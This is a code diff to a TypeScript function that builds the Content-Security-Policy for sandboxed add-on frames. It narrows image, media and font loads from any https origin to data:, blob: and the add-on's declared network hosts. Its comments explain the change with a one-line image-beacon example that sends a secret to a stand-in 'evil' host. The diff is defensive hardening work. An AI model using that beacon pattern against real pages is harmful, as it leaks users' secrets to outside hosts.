@@ -33,15 +33,22 @@
  * - `default-src 'none'` — the floor. Anything not named below (`object-src`,
  *   `manifest-src`, `prefetch-src`, `worker-src` via `child-src`) is refused.
  * - `connect-src` — unchanged: `AppManifest.networkHosts`, or `'none'`.
- * - `img-src` / `media-src` / `font-src`: `https: data: blob:`. Subresource *loads* keep
- *   the practical reach they had, minus the plaintext schemes. They are deliberately not
- *   narrowed to `networkHosts`: an add-on renders player photos, avatars and media whose
- *   URLs come from the phone at runtime and can be any https origin, so scoping these to a
- *   build-time allowlist would break every add-on that shows a picture. **That leaves a
- *   pixel-beacon to an arbitrary https host open** — see the note at the bottom of this
- *   comment, which is a decision to take deliberately rather than a gap to leave unsaid.
- *   `font-src` is here for the same reason as the other two, and because a bundler inlines
- *   a small face as a `data:` URI, which `default-src 'none'` would otherwise refuse.
+ * - `img-src` / `media-src` / `font-src`: `data: blob:` plus `networkHosts`. So
+ *   `networkHosts` means *every* outbound request the frame makes, not only `fetch()`.
+ *   Until MICA-202 these were `https: data: blob:` — subresource loads kept the practical
+ *   reach they had, on the theory that an add-on renders photos and avatars whose URLs
+ *   the phone hands it at runtime from any https origin. The audit behind MICA-202 found
+ *   that theory did not describe the phone: everything the media service delivers to an
+ *   add-on is a `data:` URI (`server/services/Media.ts`, "the delivery path is a data URI
+ *   either way"), avatars are `data:`, and no in-tree add-on names an https image, clip
+ *   or face anywhere. The one thing that can put an https URL in front of an add-on is
+ *   another resource calling the `AddMedia` export with a hotlinked `url` — and that row
+ *   now draws as a broken image inside a `core: false` add-on rather than opening
+ *   `new Image().src = 'https://evil/?' + secret` to every add-on on the phone. `data:`
+ *   and `blob:` stay because neither leaves the frame, and because a bundler inlines a
+ *   small font face as a `data:` URI, which `default-src 'none'` would otherwise refuse.
+ *   `'self'` is deliberately not here: the frame is `sandbox="allow-scripts"` with no
+ *   `allow-same-origin`, so its origin is opaque and `'self'` matches nothing.
  * - `script-src` / `style-src` — **exactly as before this existed**. Unset with no
  *   `default-src` meant unrestricted; under a `default-src 'none'` floor, "unrestricted"
  *   has to be written out, which is what the scheme list and the two `'unsafe-'` keywords
@@ -67,10 +74,12 @@
  *
  * ## What this still does not stop
  *
- * `img-src https:` permits `new Image().src = 'https://evil/?' + secret`. Closing that
- * means scoping `img-src` to `networkHosts`, which breaks any add-on rendering a photo from
- * a host it never declared — a published-contract break, not a bug fix, and so not one to
- * take quietly inside a hardening pass.
+ * A declared host is a declared host: an add-on whose `networkHosts` names
+ * `https://api.example.com` can beacon to it with an `<img>` exactly as it can `fetch()`
+ * it, and that is the point — the manifest is the whole statement of where a bundle may
+ * send bytes, and a reader no longer has to know that images were the exception. What
+ * remains is the sandbox's own self-navigation, which no directive Chromium ships can
+ * stop and which the host counts documents to catch (`IframeHostServer.ts`).
  */
 function cspFor(networkHosts: readonly string[]): string {
   /**
@@ -80,12 +89,18 @@ function cspFor(networkHosts: readonly string[]): string {
    * a reader would have to go and derive. Say it.
    */
   const connect = networkHosts.length > 0 ? networkHosts.join(' ') : "'none'";
+  /**
+   * Subresources: the schemes that cannot leave the frame, then the same hosts `fetch()`
+   * may reach. Never `'none'`, because `data:` is always in the list — and never `https:`
+   * again, which is what MICA-202 closed.
+   */
+  const loads = ['data:', 'blob:', ...networkHosts].join(' ');
   const policy = [
     "default-src 'none'",
     `connect-src ${connect}`,
-    'img-src https: data: blob:',
-    'media-src https: data: blob:',
-    'font-src https: data: blob:',
+    `img-src ${loads}`,
+    `media-src ${loads}`,
+    `font-src ${loads}`,
     "script-src 'unsafe-inline' 'unsafe-eval' https: http: data: blob:",
     "style-src 'unsafe-inline' https: http: data: blob:",
     "frame-src 'none'",
